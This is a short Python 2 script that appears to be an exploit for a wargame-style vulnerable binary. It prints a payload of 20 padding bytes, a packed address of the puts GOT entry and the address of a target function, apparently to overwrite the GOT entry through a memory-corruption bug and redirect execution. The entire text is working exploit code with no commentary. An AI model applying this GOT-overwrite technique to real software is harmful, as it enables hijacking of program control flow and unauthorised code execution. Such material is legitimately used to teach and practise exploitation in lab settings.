import struct

offset = "A"*20
addr_m = struct.pack("<I", 0x080484f4);
got_puts = struct.pack("<I", 0x08049928);

print offset + got_puts + " " + addr_m

